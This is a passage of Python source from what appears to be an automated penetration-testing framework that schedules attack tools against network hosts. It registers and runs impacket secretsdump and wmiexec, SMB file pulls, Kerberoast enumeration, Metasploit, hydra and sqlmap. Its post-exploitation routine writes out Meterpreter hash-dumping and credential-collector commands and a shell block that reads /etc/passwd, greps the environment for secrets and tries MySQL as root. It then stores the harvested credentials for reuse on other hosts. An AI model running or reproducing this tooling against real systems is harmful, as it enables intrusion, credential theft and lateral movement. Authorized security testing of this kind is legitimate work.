            "WB-30", "WB-31", "WB-32", "WB-33", "WB-34",
            "WB-35", "WB-36", "WB-37", "WB-38", "WB-39", "WB-40",
            "WB-01", "WB-02", "WB-06",
        ],
        cost=1.5,
        available=_struct_fetch_ok,
    )

    instruments["process_probe"] = Instrument(
        name="process_probe",
        description=(
            "Process exploit surface — ptrace_scope, user namespaces, eBPF, ASLR, "
            "SUID inventory, executable stack, shared memory, cron writability"
        ),
        wavelength=[
            "PR-01", "PR-02", "PR-03", "PR-04", "PR-05",
            "PR-06", "PR-07", "PR-08", "PR-09", "PR-10",
            # overlaps with host wickets (SUID → privesc → HO-14)
            "HO-14",
        ],
        cost=2.0,
        available=True,  # requires SSH creds at exec time; always potentially schedulable
    )

    instruments["boot_probe"] = Instrument(
        name="boot_probe",
        description=(
            "Boot/firmware attack surface — UEFI mode, Secure Boot, EFI var writability, "
            "TPM presence, GRUB protection, kernel lockdown, cmdline flags"
        ),
        wavelength=[
            "BT-01", "BT-02", "BT-03", "BT-04", "BT-05",
            "BT-06", "BT-07", "BT-08", "BT-09",
        ],
        cost=2.0,
        available=True,
    )

    instruments["gpu_probe"] = Instrument(
        name="gpu_probe",
        description=(
            "GPU / compute attack surface — IOMMU absence, OpenCL JIT, Vulkan API, "
            "GPU memory persistence, MPS context isolation, network compute APIs, "
            "GPU process injection (non-driver: compute API exploit surface)"
        ),
        wavelength=[
            "GP-01", "GP-02", "GP-03", "GP-04", "GP-05",
            "GP-06", "GP-07", "GP-08", "GP-09", "GP-10",
        ],
        cost=2.5,
        available=True,
    )

    instruments["cognitive_probe"] = Instrument(
        name="cognitive_probe",
        description=(
            "AI/LLM metacognition attack surface — confidence calibration, "
            "error detection, known-unknown discrimination, strategy revision, "
            "uncertainty propagation, overconfidence on novel domains (MC-01..MC-08)"
        ),
        wavelength=[
            "MC-01", "MC-02", "MC-03", "MC-04",
            "MC-05", "MC-06", "MC-07", "MC-08",
        ],
        cost=3.0,
        available=True,
    )

    # Impacket post-exploitation — secretsdump, wmiexec (mimikatz equivalent on Linux)
    # Available when impacket Python package is installed (confirmed via py:impacket check)
    instruments["impacket_post"] = Instrument(
        name="impacket_post",
        description="Impacket post-ex — secretsdump NTLM hashes, wmiexec remote shell (mimikatz equivalent)",
        wavelength=["HO-03", "HO-17", "AD-15"],
        cost=5.0,
        available=_AVAILABLE_TOOLS.get("py:impacket", False),
    )

    # theHarvester OSINT — domain/subdomain/email enumeration from public sources
    # Available when binary present OR always (Python fallback via crt.sh CT logs)
    import shutil as _shutil_di
    _harvester_avail = (
        bool(_shutil_di.which("theHarvester") or _shutil_di.which("theharvester"))
        or True  # crt.sh Python fallback always works
    )
    instruments["theharvester"] = Instrument(
        name="theharvester",
        description="theHarvester OSINT — subdomains, emails, hosts from crt.sh / public DNS",
        wavelength=["HO-25", "WB-01", "AD-01"],
        cost=2.0,
        available=_harvester_avail,
    )

    # smbclient share enumeration — lists shares, tests read/write access, pulls
    # interesting files.  Installed on this system (/usr/bin/smbclient).
    instruments["smbclient"] = Instrument(
        name="smbclient",
        description="smbclient share enumeration — list shares, test access, pull sensitive files",
        wavelength=["HO-06", "HO-07", "HO-19", "HO-20", "AD-04"],
        cost=2.5,
        available=_AVAILABLE_TOOLS.get("smbclient", False),
    )

    # LDAP enumeration via ldap3 Python library — anonymous bind check, user/group/
    # computer/GPO enumeration, Kerberoastable SPNs, LAPS attributes.
    instruments["ldap_enum"] = Instrument(
        name="ldap_enum",
        description="LDAP/AD enumeration — anonymous bind, users, groups, Kerberoastable SPNs, LAPS",
        wavelength=["AD-01", "AD-02", "AD-03", "AD-04", "AD-05", "AD-15", "HO-05"],
        cost=3.0,
        available=_AVAILABLE_TOOLS.get("py:ldap3", False),
    )

    # OpenSSL TLS scanning — weak protocol detection, cert analysis, SAN OSINT.
    # Always available (openssl installed at /usr/bin/openssl).
    instruments["openssl_tls"] = Instrument(
        name="openssl_tls",
        description="OpenSSL TLS scan — weak ciphers/protocols, self-signed/expired certs, SAN enumeration",
        wavelength=["WB-05", "WB-06", "WB-07", "HO-25"],
        cost=1.5,
        available=_AVAILABLE_TOOLS.get("openssl", False),
    )

    # Register instrument wavelengths with the wicket graph so it can classify
    # hypotheses as observable (instrument exists) vs dark (no instrument).
    _inst_wavelengths = {
        name: list(inst.wavelength)
        for name, inst in instruments.items()
        if inst.available
    }
    if _wgraph is not None:
        try:
            _wgraph.register_instruments(_inst_wavelengths)
        except Exception:
            pass
    # Write wavelength sidecar so CLI tools can classify hypotheses without
    # importing the gravity field (which has module-level side effects).
    try:
        _wl_path = SKG_STATE_DIR / "instrument_wavelengths.json"
        _wl_path.write_text(json.dumps(_inst_wavelengths, indent=2))
    except Exception:
        pass

    return instruments


# ── Field energy computation ─────────────────────────────────────────────

def load_wicket_states(node_key: str) -> dict:
    """
    Load and kernel-aggregate all wicket observations for a node.

    node_key is the stable identity_key for the node.  For IP-only hosts this
    equals the IP address.

    Replaces last-write-wins with support vector aggregation:
      SupportEngine.aggregate() → CollapseThresholds → StateEngine.collapse()

    Returns {wicket_id: {"status": str, "detail": str, "ts": str, "phi_r": float, "phi_b": float, "phi_u": float}}
    Compatible with all existing callers.
    """
    return _kernel.states_with_detail(node_key)


def _load_events_file(path: str, states: dict, filter_ip: str = None):
    """Load events from an NDJSON file into states dict."""
    try:
        with open(path) as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                event = json.loads(line)
                payload = event.get("payload", {})

                # Filter by IP if specified
                if filter_ip:
                    aliases = {
                        str(parse_workload_ref(payload.get("workload_id", "")).get("identity_key") or "").strip(),
                        str(payload.get("target_ip") or "").strip(),
                        str(payload.get("workload_id") or "").strip(),
                    }
                    aliases.discard("")
                    if str(filter_ip or "").strip() not in aliases:
                        continue

                wid = payload.get("wicket_id")
                status = payload.get("status")
                detail = payload.get("detail", "")
                ts = event.get("ts", "")

                if wid and status:
                    prev_ts = states.get(wid, {}).get("ts", "")
                    if ts >= prev_ts:
                        states[wid] = {
                            "status": status,
                            "detail": detail,
                            "ts": ts,
                        }
    except Exception:
        pass


def field_entropy(states: dict, applicable_wickets: set, ip: str = "", folds=None) -> float:
    """
    Compute field energy E for a target via kernel EnergyEngine.
    E = |unknown wickets in applicable set| + fold weights.

    Routes through KernelStateEngine.energy() which uses the formal
    EnergyEngine.compute() from skg.kernel.energy.
    """
    if not applicable_wickets:
        return 0.0
    if ip:
        return _kernel.energy(ip, applicable_wickets, folds or [])
    # Fallback: use pre-loaded states dict (legacy callers)
    from skg.substrate.node import TriState
    unknown = sum(1 for wid in applicable_wickets
                  if (states.get(wid, {}) if isinstance(states.get(wid), dict)
                      else {"status": str(states.get(wid, "unknown"))}).get("status", "unknown") == "unknown")
    fold_weight = sum(f.gravity_weight() for f in (folds or []))
    return float(unknown) + fold_weight


def _project_gravity_events(events_file: Path, run_id: str, result: dict) -> None:
    """Best-effort projection of a fresh gravity event file into INTERP_DIR."""
    try:
        from skg.sensors.projector import project_event_file
    except Exception:
        return
    if not events_file.exists():
        return
    try:
        INTERP_DIR.mkdir(parents=True, exist_ok=True)
        outputs = project_event_file(events_file, INTERP_DIR, run_id=run_id[:8])
        if not outputs:
            return
        result["interp_files"] = [str(p) for p in outputs]
        if len(outputs) == 1:
            result["interp_file"] = str(outputs[0])
    except Exception:
        pass

def entropy_reduction_potential(
    instrument: "Instrument",
    node_key: str,
    states: dict,
    applicable_wickets: set,
    folds=None,
) -> float:
    """
    Compute instrument selection potential for a node via kernel GravityScheduler.

    node_key is the stable node identity (identity_key), not the operator target label.

    Routes through KernelStateEngine.instrument_potential() which uses:
      - SupportEngine for current wicket states
      - GravityScheduler.rank() for formal potential scoring
      - MSF escalation boost for confirmed high-value preconditions
    """
    if not instrument.available or not applicable_wickets:
        return 0.0

    # Hard failures (999 sentinel) → excluded
    history = instrument.entropy_history.get(node_key, [])
    if history and history[-1] >= 500:
        return 0.0

    # Soft no-change penalty
    failure_penalty = 1.0
    if history and len(history) >= 2 and history[-1] >= history[-2]:
        failure_penalty = 0.2

    return _kernel.instrument_potential(
        instrument_name=instrument.name,
        instrument_wavelength=instrument.wavelength,
        instrument_cost=instrument.cost,
        node_key=node_key,
        applicable_wickets=applicable_wickets,
        folds=folds,
        failure_penalty=failure_penalty,
    )


def _bounded_field_pull_boost(
    ip: str,
    effective_domains: set[str],
    sphere_pulls: dict[str, float],
    fiber_clusters_by_anchor: dict[str, object],
    sphere_persistence: dict[str, float] | None = None,
) -> float:
    from skg.topology.energy import anchored_field_pull
    return anchored_field_pull(
        ip,
        effective_domains,
        sphere_pulls,
        fiber_clusters_by_anchor,
        sphere_persistence=sphere_persistence,
    )

def load_all_wicket_ids() -> dict:
    """Load wicket IDs from all catalogs, grouped by domain. MERGES same-domain catalogs."""
    domain_wickets: dict = {}
    # Search all known catalog locations
    search_roots = [SKG_HOME]
    seen_files: set = set()
    for root in search_roots:
        for catalog_file in glob.glob(str(root / "skg-*-toolchain" / "contracts" / "catalogs" / "*.json")):
            if catalog_file in seen_files:
                continue
            seen_files.add(catalog_file)
            try:
                data = json.loads(Path(catalog_file).read_text())
                domain = data.get("domain", "unknown")
                wickets = set(data.get("wickets", {}).keys())
                # MERGE: two web catalogs both contribute their wickets
                if domain in domain_wickets:
                    domain_wickets[domain].update(wickets)
                else:
                    domain_wickets[domain] = wickets
            except Exception:
                continue
    return domain_wickets


# ── Instrument execution ────────────────────────────────────────────────

def execute_instrument(instrument: Instrument, target: dict,
                       run_id: str, out_dir: Path,
                       current_states: dict = None,
                       authorized: bool = False) -> dict:
    """
    Execute an instrument against a node.
    current_states: wicket states at time of selection (for MSF RC branching)
    Returns dict with results and entropy change.
    """
    # node_key = stable node identity (scheduling primitive).
    # ip = routable address (used for network instrument execution).
    node_key = str(target.get("identity_key") or target["ip"]).strip()
    ip = target["ip"]
    result = {
        "instrument": instrument.name,
        "target": node_key,
        "events_before": 0,
        "events_after": 0,
        "new_findings": [],
        "success": False,
    }

    # Count field state before
    states_before = load_wicket_states(node_key)
    unknown_before = sum(1 for s in states_before.values() if s.get("status") == "unknown")
    unresolved_before = sum(float(s.get("local_energy", 0.0) or s.get("phi_u", 0.0) or 0.0) for s in states_before.values())

    # ── Plugin adapter registry ────────────────────────────────────────────
    # New instruments (impacket_post, theharvester, etc.) are dispatched here.
    # The adapter registry decouples tool execution from the physics engine.
    if instrument.name in _GRAVITY_ADAPTERS:
        result = _GRAVITY_ADAPTERS[instrument.name](
            ip, target, run_id, out_dir, result,
            authorized=authorized,
            node_key=node_key,
        )

    elif instrument.name == "http_collector":
        result = _exec_http_collector(ip, target, run_id, out_dir, result)

    elif instrument.name == "auth_scanner":
        result = _exec_auth_scanner(ip, target, run_id, out_dir, result)

    elif instrument.name == "nvd_feed":
        result = _exec_nvd_feed(ip, target, run_id, out_dir, result)

    elif instrument.name == "metasploit":
        result = _exec_metasploit(ip, target, run_id, out_dir, result, current_states or states_before, authorized=authorized)

    elif instrument.name == "pcap":
        result = _exec_pcap(ip, target, run_id, out_dir, result)

    elif instrument.name == "nmap":
        result = _exec_nmap(ip, target, run_id, out_dir, result)

    elif instrument.name == "ssh_sensor":
        result = _exec_ssh_sensor(ip, target, run_id, out_dir, result)

    elif instrument.name == "bloodhound":
        result = _exec_bloodhound(ip, target, run_id, out_dir, result)

    elif instrument.name == "iot_firmware":
        result = _exec_iot_firmware(ip, target, run_id, out_dir, result)

    elif instrument.name == "ai_probe":
        result = _exec_ai_probe(ip, target, run_id, out_dir, result)

    elif instrument.name == "supply_chain":
        result = _exec_supply_chain(ip, target, run_id, out_dir, result)

    elif instrument.name == "data_profiler":
        result = _exec_data_profiler(ip, target, run_id, out_dir, result)

    elif instrument.name == "sysaudit":
        result = _exec_sysaudit(ip, target, run_id, out_dir, result)

    elif instrument.name == "iot_firmware":
        result = _exec_iot_firmware(ip, target, run_id, out_dir, result)

    elif instrument.name == "ai_probe":
        result = _exec_ai_probe(ip, target, run_id, out_dir, result)

    elif instrument.name == "supply_chain":
        result = _exec_supply_chain(ip, target, run_id, out_dir, result)



    elif instrument.name == "container_inspect":
        result = _exec_container_inspect(ip, target, run_id, out_dir, result)
    elif instrument.name == "binary_analysis":
        result = _exec_binary_analysis(ip, target, run_id, out_dir, result)
    elif instrument.name == "capa_analysis":
        result = _exec_capa_analysis(ip, target, run_id, out_dir, result)
    elif instrument.name == "angr_symbolic":
        result = _exec_angr_symbolic(ip, target, run_id, out_dir, result)
    elif instrument.name == "frida_trace":
        result = _exec_frida_trace(ip, target, run_id, out_dir, result, authorized=authorized)
    elif instrument.name == "cred_reuse":
        result = _exec_cred_reuse(ip, target, run_id, out_dir, result, authorized=authorized)

    elif instrument.name == "hydra":
        result = _exec_hydra(ip, target, run_id, out_dir, result, authorized=authorized)

    elif instrument.name == "john":
        result = _exec_john(ip, target, run_id, out_dir, result)

    elif instrument.name == "gobuster":
        result = _exec_gobuster(ip, target, run_id, out_dir, result)

    elif instrument.name == "sqlmap":
        result = _exec_sqlmap(ip, target, run_id, out_dir, result, authorized=authorized)

    elif instrument.name == "enum4linux":
        result = _exec_enum4linux(ip, target, run_id, out_dir, result)

    elif instrument.name == "nikto":
        result = _exec_nikto(ip, target, run_id, out_dir, result)

    elif instrument.name == "searchsploit":
        result = _exec_searchsploit(ip, target, run_id, out_dir, result)

    elif instrument.name == "web_struct_fetch":
        result = _exec_web_struct_fetch(ip, target, run_id, out_dir, result)

    elif instrument.name == "process_probe":
        result = _exec_process_probe(ip, target, run_id, out_dir, result)

    elif instrument.name == "boot_probe":
        result = _exec_boot_probe(ip, target, run_id, out_dir, result)

    elif instrument.name == "gpu_probe":
        result = _exec_gpu_probe(ip, target, run_id, out_dir, result)

    elif instrument.name == "cognitive_probe":
        result = _exec_cognitive_probe(ip, target, run_id, out_dir, result)

    elif instrument.name == "db_discovery":
        result = _exec_db_discovery(ip, target, run_id, out_dir, result)

    # Count field state after
    states_after = load_wicket_states(node_key)
    unknown_after = sum(1 for s in states_after.values() if s.get("status") == "unknown")
    unresolved_after = sum(float(s.get("local_energy", 0.0) or s.get("phi_u", 0.0) or 0.0) for s in states_after.values())
    result["unknowns_resolved"] = unknown_before - unknown_after
    result["unresolved_energy_reduced"] = round(unresolved_before - unresolved_after, 6)

    # Track entropy history for this instrument — keyed by node_key (stable identity)
    instrument.entropy_history.setdefault(node_key, []).append(unresolved_after)
    instrument.last_used_on[node_key] = iso_now()

    return result


def _exec_bloodhound(ip, target, run_id, out_dir, result):
    """
    Collect the AD domain graph from BloodHound CE or Neo4j and emit AD wickets.
    """
    import os as _os
    import shutil as _shutil

    bh_url      = _os.environ.get("BH_URL", "http://localhost:8080")
    bh_user     = _os.environ.get("BH_USERNAME", "admin")
    bh_pass     = _os.environ.get("BH_PASSWORD", "")
    neo4j_url   = _os.environ.get("NEO4J_URL", "bolt://localhost:7687")
    neo4j_user  = _os.environ.get("NEO4J_USER", "neo4j")
    neo4j_pass  = _os.environ.get("NEO4J_PASSWORD", "")

    domains_for_target = target.get("domains", [])
    workload_id = next((d for d in domains_for_target if "ad" in d.lower()), f"ad::{ip}")
    attack_path_id = "ad_kerberoast_v1"

    print(f"    [BH] Collecting AD graph for {workload_id}...")

    try:
        if str(REPO_ROOT) not in sys.path:
            sys.path.insert(0, str(REPO_ROOT))
        from skg.sensors.bloodhound_sensor import (
            BloodHoundCEClient, Neo4jClient, collect_via_api,
            collect_via_neo4j, write_bh_dir,
        )
        from skg.sensors.adapter_runner import run_bloodhound
        from skg.core.paths import SKG_STATE_DIR
    except ImportError as exc:
        result["error"] = f"BloodHound sensor import failed: {exc}"
        return result

    data = None
    if bh_pass:
        try:
            client = BloodHoundCEClient(bh_url, bh_user, bh_pass)
            data = collect_via_api(client)
        except Exception as exc:
            print(f"    [BH] CE API failed ({exc}), trying Neo4j...")

    if data is None and neo4j_pass:
        try:
            client = Neo4jClient(neo4j_url, neo4j_user, neo4j_pass)
            data = collect_via_neo4j(client)
            client.close()
        except Exception as exc:
            result["error"] = f"Neo4j also unavailable: {exc}"
            return result

    if data is None:
        result["success"] = False
        result["error"] = "No BloodHound source reachable (set BH_PASSWORD or NEO4J_PASSWORD)"
        return result

    bh_dir = SKG_STATE_DIR / "bh_cache" / run_id[:8]
    _shutil.rmtree(bh_dir, ignore_errors=True)
    write_bh_dir(data, bh_dir)

    try:
        events = run_bloodhound(bh_dir, workload_id, attack_path_id, run_id)
    except Exception as exc:
        result["error"] = f"BloodHound adapter failed: {exc}"
        return result

    ev_file = out_dir / f"gravity_bh_{ip.replace('.','_')}_{run_id[:8]}.ndjson"
    with open(ev_file, "w") as fh:
        for ev in events:
            ev.setdefault("payload", {})["target_ip"] = ip
            fh.write(json.dumps(ev) + "\n")

    try:
        EVENTS_DIR.mkdir(parents=True, exist_ok=True)
        (EVENTS_DIR / ev_file.name).write_text(ev_file.read_text())
    except Exception:
        pass

    result["success"] = True
    result["events"] = len(events)
    result["events_file"] = str(ev_file)
    _project_gravity_events(ev_file, run_id, result)
    print(f"    [BH] {workload_id}: {len(events)} AD wicket events → {ev_file.name}")
    return result



def _exec_ai_probe(ip, target, run_id, out_dir, result):
    """
    Dual-mode AI instrument:

    Mode 1 — AI SERVICE PROBE (target IS an AI/ML endpoint)
    Probes known AI service ports (Ollama :11434, Qdrant, Jupyter, MLflow etc.)
    and emits AI-01..AI-20 wicket events.

    Mode 2 — FIELD ANALYST (use LLM to analyze gathered observations)
    When Ollama/Claude is available, reads current nmap/web/SSH observations
    for this target and asks the LLM to:
      - Identify likely vulnerability vectors from banners and services
      - Rank next instruments by expected yield
      - Emit intelligence observations as MC- (metacognition) wicket events
    Both modes run when applicable.
    """
    all_events: list = []
    events_file = out_dir / f"gravity_ai_{ip.replace('.','_')}_{run_id[:8]}.ndjson"

    # ── Mode 1: AI service probe ──────────────────────────────────────────
    AI_ADAPTER = SKG_HOME / "skg-ai-toolchain" / "adapters" / "ai_probe" / "probe.py"
    try:
        ai_probe = _load_module_from_file("skg_ai_probe", AI_ADAPTER)
        probe_device = ai_probe.probe_device
        service_events = probe_device(
            host=ip,
            workload_id=f"ai_target::{ip}",
            run_id=run_id,
            attack_path_id="ai_llm_extract_v1",
            out_path=str(events_file),
        )
        # service_events are summary dicts, not event envelopes — do not add to
        # all_events or they will overwrite the real events probe_device already
        # wrote to events_file (MED-45 fix).
        realized_ai = [e["wicket_id"] for e in (service_events or []) if e.get("status") == "realized"]
        if realized_ai:
            print(f"    [AI-PROBE] {ip}: AI services found — {realized_ai[:5]}")
        else:
            print(f"    [AI-PROBE] {ip}: no AI/ML services on standard ports")
    except Exception as e:
        log.debug(f"[AI-PROBE] service probe failed for {ip}: {e}")

    # ── Mode 2: LLM field analyst ─────────────────────────────────────────
    # Collect gathered observations to give the LLM context
    now_ts = iso_now()
    observation_context = []

    # Pull nmap results
    nmap_files = sorted(glob.glob(str(DISCOVERY_DIR / f"gravity_nmap_{ip}_*.ndjson")))
    for nf in nmap_files[-2:]:
        try:
            for line in Path(nf).read_text().splitlines():
                if not line.strip():
                    continue
                ev = json.loads(line)
                detail = ev.get("payload", {}).get("detail", "")
                wid = ev.get("payload", {}).get("wicket_id", "")
                if detail and wid:
                    observation_context.append(f"nmap: {wid} — {str(detail)[:120]}")
        except Exception:
            pass

    # Pull web observations
    web_files = sorted(glob.glob(str(DISCOVERY_DIR / f"gravity_http_{ip}_*.ndjson")))
    for wf in web_files[-1:]:
        try:
            for line in Path(wf).read_text().splitlines():
                if not line.strip():
                    continue
                ev = json.loads(line)
                detail = ev.get("payload", {}).get("detail", "")
                wid = ev.get("payload", {}).get("wicket_id", "")
                if detail and wid:
                    observation_context.append(f"web: {wid} — {str(detail)[:120]}")
        except Exception:
            pass

    services_summary = ", ".join(
        f"{s.get('port')}/{s.get('service','?')}" + (f"({s.get('banner','')})" if s.get('banner') else "")
        for s in (target.get("services") or [])[:12]
    ) or "none discovered yet"

    if observation_context:
        prompt = (
            f"You are analyzing a security engagement target: {ip}\n"
            f"Open services: {services_summary}\n\n"
            f"Recent observations:\n" + "\n".join(observation_context[:30]) + "\n\n"
            f"Based on these observations:\n"
            f"1. What are the most likely vulnerability vectors? (be specific: CVEs, misconfigs, weak auth)\n"
            f"2. What should be probed next and why?\n"
            f"3. Is there anything unusual or high-value about this target?\n"
            f"Keep your answer concise (3-5 sentences per point). Focus on actionable intelligence."
        )
        try:
            from skg.resonance.drafter import draft_response
            analysis = draft_response(prompt, max_tokens=600, temperature=0.3)
            if analysis and len(analysis) > 50:
                print(f"    [AI-ANALYST] {ip}: LLM analysis complete")
                print(f"      {analysis[:300].replace(chr(10), ' ')}")
                # Emit as metacognition wicket
                mc_ev = _gravity_precondition_event(
                    source_id="ai_analyst",
                    toolchain="skg-ai-toolchain",
                    wicket_id="MC-01",
                    status="realized",
                    workload_id=f"ai_analyst::{ip}",
                    target_ip=ip,
                    detail=analysis[:500],
                    evidence_rank=3,
                    source_kind="llm_analysis",
                    pointer=f"ai_analyst://{ip}",
                    confidence=0.70,
                    run_id=run_id,
                    version="0",
                    ts=now_ts,
                )
                all_events.append(mc_ev)
                # Write the MC event to a separate file for the analyst panel
                mc_file = out_dir / f"gravity_analyst_{ip.replace('.','_')}_{run_id[:8]}.ndjson"
                with open(mc_file, "w") as fh:
                    fh.write(json.dumps(mc_ev) + "\n")
        except Exception as exc:
            log.debug(f"[AI-ANALYST] LLM analysis failed for {ip}: {exc}")

    # Append any additional envelope-shaped events (e.g. MC-01 from LLM analyst)
    # to whatever probe_device already wrote to events_file.  Use "a" not "w"
    # so the real adapter-authored events are preserved (MED-45 fix).
    if all_events:
        with open(events_file, "a") as fh:
            for ev in all_events:
                fh.write(json.dumps(ev) + "\n")
    elif not events_file.exists():
        events_file.touch()

    total_events = (
        sum(1 for ln in events_file.read_text().splitlines() if ln.strip())
        if events_file.exists() else 0
    )
    result["success"] = True
    result["events"]  = total_events
    result["events_file"] = str(events_file)

    try:
        EVENTS_DIR.mkdir(parents=True, exist_ok=True)
        (EVENTS_DIR / events_file.name).write_text(events_file.read_text())
    except Exception:
        pass
    _project_gravity_events(events_file, run_id, result)

    return result


def _exec_post_exploitation(ip, target, run_id, out_dir, result, session_id=None):
    """
    Run post-exploitation data collection after a Meterpreter/shell session opens.
    
    Collects:
      HO-03: valid credentials (from passwd/shadow)
      HO-07: SUID binaries present
      HO-06: sudo misconfiguration
      HO-09: credentials in environment
      HO-10: running as root
      WB-20: database access (from running mysql process / creds in config)
      CE-01: running inside container (from .dockerenv, cgroup)
    
    Writes events to gravity_postexp_{ip}_{run_id}.ndjson.
    """
    import subprocess as _sp
    import uuid as _uuid

    now = datetime.now(timezone.utc).isoformat()
    events_file = out_dir / f"gravity_postexp_{ip.replace('.','_')}_{run_id[:8]}.ndjson"
    workload_id = f"host::{ip}"

    # Initialize session state before any branch references it (MED-46 fix)
    has_msf_session: bool = False
    active_sessions: dict = {}

    def make_event(wicket_id, status, confidence, detail):
        return json.dumps(
            _gravity_precondition_event(
                source_id="adapter.post_exploitation",
                toolchain="skg-host-toolchain",
                wicket_id=wicket_id,
                status=status,
                workload_id=workload_id,
                target_ip=ip,
                detail=detail,
                evidence_rank=1,
                source_kind="runtime",
                pointer=ip,
                confidence=confidence,
                run_id=run_id,
                attack_path_id="host_linux_privesc_sudo_v1",
                version="0",
                ts=now,
            )
        ) + "\n"

    # Determine target OS from session metadata or target config
    target_os = (target.get("os") or target.get("kind") or "").lower()
    if not target_os:
        # Infer from active sessions — use the IP-matched session platform
        for _sid, _sess in active_sessions.items():
            if ip in _sess.get("target_host", _sess.get("tunnel_peer", "")):
                target_os = _sess.get("platform", "").lower()
                session_id = session_id or _sid
                break

    is_windows = "windows" in target_os or any(
        p in (target.get("services") or [])
        for p in [{"port": 5985}, {"port": 3389}, {"port": 5986}]
    )

    if is_windows:
        # Windows Meterpreter: use meterpreter commands, not shell/bash
        post_commands = """
run post/multi/recon/local_exploit_suggester
getuid
getpid
sysinfo
run post/windows/gather/enum_logged_on_users
run post/windows/gather/smart_hashdump
run post/windows/gather/enum_shares
run post/windows/gather/credentials/credential_collector
run post/multi/manage/shell_to_meterpreter
"""
        # Meterpreter RC: issue commands directly, no shell needed
        post_rc_template = """\
# Post-exploitation (Windows Meterpreter) for {ip}
sessions -i {sid}
{cmds}
exit
"""
    else:
        # Linux/Unix: bash post-exploitation via shell
        post_commands = """
echo "---SKG-WHOAMI---"
whoami && id
echo "---SKG-HOSTNAME---"
hostname && uname -a
echo "---SKG-DOCKER---"
ls /.dockerenv 2>/dev/null && echo DOCKER_ENV_FOUND || echo NO_DOCKER_ENV
cat /proc/1/cgroup 2>/dev/null | head -5
echo "---SKG-SUDO---"
sudo -l -n 2>/dev/null | head -20
echo "---SKG-SUID---"
find / -perm -4000 -type f 2>/dev/null | head -20
echo "---SKG-PASSWD---"
cat /etc/passwd | head -20
echo "---SKG-ENV---"
env | grep -iE "pass|pwd|key|secret|token|db_" | head -10
echo "---SKG-MYSQL---"
mysql -u root -e "show databases;" 2>/dev/null || echo NO_MYSQL_ROOT
echo "---SKG-DONE---"
"""
        post_rc_template = """\
# Post-exploitation (Linux shell) for {ip}
sessions -i {sid}
shell
{cmds}
exit
"""

    # Check for active MSF sessions using pymetasploit3 RPC (same process space).
    # Subprocess msfconsole would open a separate process with independent sessions.
    try:
        from pymetasploit3.msfrpc import MsfRpcClient as _MsfRpcClient
        import os as _os
        _msf_pass = _os.environ.get("MSF_PASSWORD", "")
        if _msf_pass:
            _rpc = _MsfRpcClient(
                _msf_pass,
                server=_os.environ.get("MSF_HOST", "127.0.0.1"),
                port=int(_os.environ.get("MSF_PORT", "55553")),
                username=_os.environ.get("MSF_USER", "msf"),
                ssl=True,
            )
            active_sessions = dict(_rpc.sessions.list)
            has_msf_session = len(active_sessions) > 0
    except Exception:
        pass

    output = ""
    if has_msf_session:
        # Session exists — run post-exploitation via RPC console (same process space)
        _sid = session_id or next(iter(active_sessions), 1)
        post_rc = out_dir / f"postexp_{ip.replace('.','_')}_{run_id[:8]}.rc"
        post_rc_content = post_rc_template.format(
            ip=ip, sid=_sid, cmds=post_commands)
        post_rc.write_text(post_rc_content)

        try:
            post_out = _sp.run(
                ["msfconsole", "-q", "-r", str(post_rc)],
                capture_output=True, text=True, timeout=120
            )
            output = post_out.stdout + post_out.stderr
        except Exception as e:
            result["error"] = f"Post-exploitation failed: {e}"
            return result
    else:
        # Fall back to the same SSH foothold SKG already validated elsewhere.
        try:
            client, used, last_exc = _connect_ssh_with_fallback(
                ip,
                f"host::{ip}",
                "host_linux_privesc_sudo_v1",
            )
        except Exception as e:
            result["success"] = False
            result["error"] = f"No active session and SSH fallback unavailable: {e}"
            return result
        if client is None or used is None:
            result["success"] = False
            result["error"] = f"No active session and SSH fallback failed: {last_exc}"
            return result
        try:
            _, stdout, stderr = client.exec_command(post_commands, timeout=60)
            output = stdout.read().decode(errors="replace") + stderr.read().decode(errors="replace")
            result["collection_mode"] = "ssh_fallback"
            result["ssh_user"] = used.get("user")
        finally:
            try:
                client.close()
            except Exception:
                pass

    # Parse output and emit wicket events
    events = []

    # HO-10: running as root
    if "root" in output.lower() and ("uid=0" in output or "whoami" in output.lower()):
        events.append(make_event("HO-10","realized",0.99,"Running as root (uid=0)"))

    # HO-07: SUID binaries
    suid_lines = [l for l in output.split("\n") if "---SKG-SUID---" in output
                  and l.strip().startswith("/")]
    if suid_lines or "/usr/bin/sudo" in output or "/bin/su" in output:
        events.append(make_event("HO-07","realized",0.90,
            f"SUID binaries found: {suid_lines[:3]}"))

    # HO-06: sudo misconfiguration
    if "NOPASSWD" in output or "(ALL)" in output:
        events.append(make_event("HO-06","realized",0.95,
            "sudo NOPASSWD or ALL found"))

    # ── CredentialStore: wire harvested creds so cred_reuse works at runtime ──
    try:
        import sys as _csys
        _csys.path.insert(0, str(Path(__file__).parent))
        from cred_reuse import CredentialStore as _CredStore
        _cstore = _CredStore()
    except Exception:
        _cstore = None

    def _store_cred(user, secret, wicket, ctype="password"):
        if _cstore and user and secret:
            _cstore.add(user=user, secret=secret, origin_ip=ip,
                        origin_wicket=wicket, source="post_exploitation",
                        cred_type=ctype)

    # HO-09: credentials in environment
    env_lines = [l for l in output.split("\n")
                 if any(k in l.upper() for k in ("PASS","PWD","KEY","SECRET","TOKEN"))]
    if env_lines:
        events.append(make_event("HO-09","realized",0.85,
            f"Credentials in env: {env_lines[:2]}"))
        for _el in env_lines[:5]:
            if "=" in _el:
                _k, _v = _el.split("=", 1)
                _store_cred(user=_k.strip(), secret=_v.strip(), wicket="HO-09")

    # CE-01: container escape possible (running in Docker)
    if "DOCKER_ENV_FOUND" in output or "docker" in output.lower():
        events.append(make_event("CE-01","realized",0.90,
            "Running inside Docker container (/.dockerenv found)"))

    # WB-20: database access
    if "NO_MYSQL_ROOT" not in output and "Database" in output:
        events.append(make_event("WB-20","realized",0.95,
            "MySQL accessible as root — database access confirmed"))
        _store_cred(user="root", secret="", wicket="WB-20")

    # HO-03: valid system credentials accessible
    passwd_lines = [l for l in output.split("\n") if ":" in l and l.startswith("root")]
    if passwd_lines:
        events.append(make_event("HO-03","realized",0.80,
            f"System passwd accessible: {passwd_lines[0][:80]}"))
        # Store the username from /etc/passwd for later reuse attempts
        _pparts = passwd_lines[0].split(":")
        if len(_pparts) >= 1:
            _store_cred(user=_pparts[0], secret="", wicket="HO-03")

    # Windows: store hashes from smart_hashdump output
    if is_windows:
        import re as _re
        for _hline in output.splitlines():
            # Format: Administrator:500:aad3b:ntlmhash:::
            _hm = _re.match(r'^(\w+):\d+:[a-fA-F0-9]{32}:([a-fA-F0-9]{32}):::', _hline)
            if _hm:
                _store_cred(user=_hm.group(1), secret=_hm.group(2),
